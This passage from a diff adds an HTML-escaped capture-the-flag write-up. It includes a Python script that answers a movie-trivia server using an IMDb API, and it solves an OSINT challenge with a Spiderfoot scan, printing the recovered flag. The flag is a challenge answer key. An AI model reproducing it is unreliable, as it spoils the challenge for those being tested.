+&amp;gt; A Dog'&lt;/span&gt;s Purpose &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2017-01-19&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I wrote the following Python3 script for this task.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;nclib&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;json&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;KEY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'APIKEY'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;SEARCH_API&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'https://imdb-api.com/en/API/SearchMovie/'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;CAST_API&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'https://imdb-api.com/en/API/FullCast/'&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;receive_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse_movie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_movie_raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;movie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_movie_raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rstrip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;movie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;movie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;(&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_movie_details&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_movie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parse_movie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_movie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+	
+	&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_movie_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+		
+		&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SEARCH_API&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KEY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;results&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;IndexError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;TypeError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+			&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sleeping&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;get_movie_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_movie_cast&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
+			&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CAST_API&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KEY&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+
+			&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unicodedata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;normalize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'NFD'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;actors&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ascii'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'ignore'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;
+
+		&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;IndexError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;TypeError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+			&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sleeping&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;get_movie_cast&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+	&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_movie_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;actors&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_movie_cast&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'; '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;actors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send_movie_details&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;details&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;details&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;ADDRESS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'challenge.ctf.games'&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;31260&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;CURRENT_MOVIE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;RECORD_MOVIE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nclib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Netcat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ADDRESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+		
+		&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;receive_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RECORD_MOVIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;CURRENT_MOVIE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;
+			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;RECORD_MOVIE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RECORD_MOVIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;RECORD_MOVIE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;details&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_movie_details&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURRENT_MOVIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+				&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;details&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;send_movie_details&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;details&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;CURRENT_MOVIE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A notable line is&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unicodedata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;normalize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'NFD'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;actors&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ascii'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'ignore'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;where I normalize characters with accents since those seemed to give the listener trouble.&lt;/p&gt;
+
+&lt;h2 id=&quot;osint&quot;&gt;OSINT&lt;/h2&gt;
+&lt;h3 id=&quot;don-t-mason&quot;&gt;Don T. Mason&lt;/h3&gt;
+&lt;p&gt;Challenge Author: @JohnHammond#6971&lt;/p&gt;
+
+&lt;p&gt;I just used the name “Don T. Mason” as a seed for a Spiderfoot scan and clicked through all of the website profile pages it generated. Eventually I came accross &lt;a href=&quot;https://mastodon.social/@donmason?max_id=106774436605922101&quot;&gt;this&lt;/a&gt; Mastodon page and when I saw all the elephants I knew I’d found it. I also knew I’d found it just when I saw the website name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mastodon&lt;/code&gt;, since it’s an ancestor of the elephant species. Also Don T. Mason is an anagram for Mastodon.&lt;/p&gt;
+
+&lt;p&gt;The flag was in one of the posts:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;I guess there is no hiding it.
+
+The trunk is used for breathing, bringing food and water to the mouth, and grasping objects. Tusks, which are derived from the incisor teeth, serve both as weapons and as tools for moving objects and digging. . Among African elephants, forest elephants have smaller and more rounded ears and thinner and straighter tusks than bush elephants and are limited in range to the forested areas of western and Central Africa.
+
+flag{fbec1486e542c5d96f725cd6009ffef5}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;mike-shallot&quot;&gt;Mike Shallot&lt;/h3&gt;
